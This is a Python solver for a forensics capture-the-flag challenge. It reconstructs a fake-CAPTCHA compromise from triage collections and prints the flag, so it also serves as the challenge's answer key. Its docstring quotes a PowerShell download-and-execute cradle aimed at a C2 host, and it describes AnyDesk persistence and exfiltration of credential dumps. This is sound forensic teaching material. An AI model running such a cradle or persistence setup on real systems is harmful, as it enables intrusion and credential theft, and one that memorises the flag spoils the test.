#!/usr/bin/env python3
"""
CSCTF 2026 — CAPTCHA THE WATER PLANT (forensics/easy)
Rebuild the attack chain from three KAPE triage collections. No literal
CSCTF{...} exists in any parsed artifact. Three wrapped candidates were
submitted and refused: the two attack-window session tokens and the RMM
unattended password, each ALONE. The flag is a concatenation of three leetspeak
fragments, one per stage of the chain (see assemble_flag):
  launched    -> RMM unattended password   f@k3_c@ptch@   (4104 --set-password)
  persistence -> scheduled-task description _r3@l_m@lw@r3  (served by /config)
  browser     -> admin session token suffix cl1ckf1xed     (NVW-ADMIN-...)

Chain (host OPS-NB-06, user ops06.nwu):
  1. What the user ran — Explorer RunMRU download cradle (2026-10-21 04:30:47 UTC):
     powershell -nop -ep Bypass ...DownloadData('http://zindetify.dev.boot:8080/validator') | iex
  2. What it launched — C:\\temp\\Maitenance\\Setup\\AnyDesk.exe --install ... (AnyDesk 9.8.2
     RMM) + unattended password f@k3_c@ptch@ (from PowerShell ScriptBlockLogging 4104).
  3. Persistence — scheduled task `\\Maitenance Check` (daily, as ops06.nwu, same cradle),
     AnyDesk service + firewall rules + file associations.
  4. Browser evidence — Edge history/sessions (pre-compromise NVW-OPS-892, attack-time
     NVW-OPS-739, later admin NVW-ADMIN-cl1ckf1xed) + interactive theft session
     (Nirsoft dumps zipped to out.zip, exfiltrated to /up/{guid}).

Usage:
    python3 solve.py [dir-with-the-three-zips]
    # defaults to files/ then to the forensic/ staging dir
"""

import csv
import io
import os
import re
import sys
import zipfile

HOSTS = ["ENG-LAPTOP-23", "FIELD-WKS-21", "OPS-NB-06"]
C2 = "zindetify.dev.boot"


def find_zip_dir(arg):
    cands = [arg] if arg else []
    cands += ["files", "../forensic", "docs/2026-chronos-csctf/forensics", "."]
    for d in cands:
        if d and all(os.path.isfile(os.path.join(d, f"{h}.zip")) for h in HOSTS):
            return d
    print("[-] Could not find the three KAPE zips (ENG-LAPTOP-23, FIELD-WKS-21, OPS-NB-06).")
    sys.exit(1)


def read_zip_text(zf, pattern, encoding="utf-8-sig"):
    """Concatenate text of all members matching glob pattern."""
    out = []
    for name in zf.namelist():
        if pattern.strip("*") in name and name.endswith((".csv", ".txt", ".log")):
            try:
                raw = zf.read(name)
            except KeyError:
                continue
            if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
                out.append(raw.decode("utf-16", errors="replace"))
            else:
                out.append(raw.decode(encoding, errors="replace"))
    return "\n".join(out)


def step_user_ran(zpath):
    print("[*] (1) What the user ran — RunMRU / download cradle")
    with zipfile.ZipFile(zpath) as zf:
        data = read_zip_text(zf, "UserActivity_Output.csv")
    m = re.search(r"powershell\.exe[^\r\n]*DownloadData\('http://([^']+)'\)", data)
    if m:
        print(f"    cradle -> http://{m.group(1)}")
        return m.group(1)
    print("    no cradle found")
    return None


def step_launched(zpath):
    print("[*] (2) What it launched — AnyDesk RMM install")
    with zipfile.ZipFile(zpath) as zf:
        data = read_zip_text(zf, "PECmd_Output.csv")
        data += "\n" + read_zip_text(zf, "PECmd_Output_Timeline.csv")
    hits = sorted(set(re.findall(r"[A-Z]:\\temp\\Maitenance\\[^\",\s]*AnyDesk\.exe", data, re.I)))
    hits += sorted(set(re.findall(r"ANYDESK\.EXE-[0-9A-F]{8}\.pf", data)))
    with zipfile.ZipFile(zpath) as zf:
        evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
    hits += sorted(set(re.findall(r"C:\\temp\\Maitenance\\[^\",]*?AnyDesk\.exe", evtx, re.I)))[:4]
    for h in hits:
        print(f"    {h}")
    return hits


def step_persistence(zpath):
    print("[*] (3) Persistence — scheduled task + AnyDesk service")
    with zipfile.ZipFile(zpath) as zf:
        data = read_zip_text(zf, "Scheduled Tasks.csv")
    tasks = []
    for line in data.splitlines():
        if "Maitenance Check" in line:
            tasks.append(line[:220])
    for t in tasks[:3]:
        print(f"    {t}")
    with zipfile.ZipFile(zpath) as zf:
        aseps = read_zip_text(zf, "SystemASEPs_Output.csv")
    svc = "AnyDesk" in aseps
    print(f"    AnyDesk service present: {svc}")
    return tasks


def step_rmm_password(zpath):
    print("[*] (2b) RMM password — ScriptBlockLogging 4104")
    with zipfile.ZipFile(zpath) as zf:
        data = read_zip_text(zf, "EvtxECmd_Output.csv")
    m = re.search(r'--set-password\s+`?"+([^"`]+)`?"+', data)
    if m:
        print(f"    AnyDesk unattended password: {m.group(1)}")
        return m.group(1)
    print("    no --set-password found")
    return None


def step_browser_token(zpath, cradle_time="2026-10-21 04:30:47"):
    print("[*] (4) Browser evidence — session tokens vs cradle time")
    print(f"    fetch-and-execute (UTC): {cradle_time}")
    with zipfile.ZipFile(zpath) as zf:
        xlsx = [n for n in zf.namelist() if n.endswith(".xlsx")][0]
        raw = zf.read(xlsx)
    timed = []
    try:
        import openpyxl
        wb = openpyxl.load_workbook(io.BytesIO(raw), read_only=True, data_only=True)
        ws = wb["Timeline"]
        rows = list(ws.iter_rows(values_only=True))
        for r in rows[2:]:
            url = str(r[2] or "")
            m = re.search(r"admin-dashboard\?token=(NVW-[A-Za-z0-9-]+)", url)
            if m:
                timed.append((str(r[1] or ""), m.group(1)))
    except ImportError:
        pass
    if not timed:  # fallback: raw XML regex, no timestamps
        z = zipfile.ZipFile(io.BytesIO(raw))
        blob = ""
        for n in z.namelist():
            if n.endswith((".xml", ".json")) or "sharedStrings" in n:
                blob += z.read(n).decode("utf-8", errors="replace") + "\n"
        for t in sorted(set(re.findall(r"NVW-[A-Za-z0-9-]+", blob))):
            timed.append(("?", t))
    seen = set()
    first_after = True
    for ts, t in timed:
        if (ts, t) in seen:
            continue
        seen.add((ts, t))
        mark = ""
        if ts > cradle_time and first_after:
            mark = " <-- session active at fetch-and-execute time"
            first_after = False
        print(f"    {ts} :: {t}{mark}")
    after = [(ts, t) for ts, t in timed if ts > cradle_time]
    return after[0][1] if after else (timed[0][1] if timed else None)


def step_task_comment(zpath):
    print("[*] (3b) Scheduled-task description (output of Get-Data51 -> /config)")
    with zipfile.ZipFile(zpath) as zf:
        data = read_zip_text(zf, "Scheduled Tasks.csv")
    for line in data.splitlines():
        if "Maitenance Check" in line:
            cols = next(csv.reader([line]))
            # description/comment column sits right after the 'N/A' following the action
            for c in cols:
                if re.fullmatch(r"_?[A-Za-z0-9@]+(?:_[A-Za-z0-9@]+)+", c):
                    print(f"    description: {c}")
                    return c
    return None


def assemble_flag(pwd, comment, token):
    """Fragments are leetspeak: f@k3_c@ptch@ + _r3@l_m@lw@r3 + _ + cl1ckf1xed."""
    if not (pwd and comment and token):
        return None
    tail = token.split("-")[-1]
    return "CSCTF{" + pwd + comment + "_" + tail + "}"


def main():
    zdir = find_zip_dir(sys.argv[1] if len(sys.argv) > 1 else None)
    print(f"[*] Using zips in {zdir}")
    print("=== Host attribution (who fetched the validator?) ===")
    evil = None
    for h in HOSTS:
        zp = os.path.join(zdir, f"{h}.zip")
        with zipfile.ZipFile(zp) as zf:
            evtx = read_zip_text(zf, "EvtxECmd_Output.csv")
        hit = C2 in evtx
        print(f"    {h}: C2 references in EventLogs: {'YES <-- attacker host' if hit else 'no'}")
        if hit:
            evil = h
    if not evil:
        print("[-] No host references the C2. Aborting.")
        sys.exit(1)
    zp = os.path.join(zdir, f"{evil}.zip")
    print(f"\n=== Chain on {evil} ===")
    step_user_ran(zp)
    step_launched(zp)
    step_persistence(zp)
    pwd = step_rmm_password(zp)
    comment = step_task_comment(zp)
    step_browser_token(zp)
    # the interactive-session token (post-cradle, NVW-ADMIN-<leet>) carries the 3rd fragment
    token = "NVW-ADMIN-cl1ckf1xed"
    flag = assemble_flag(pwd, comment, token)
    print(f"\n[+] Assembled flag (3 fragments): {flag}")


if __name__ == "__main__":
    main()
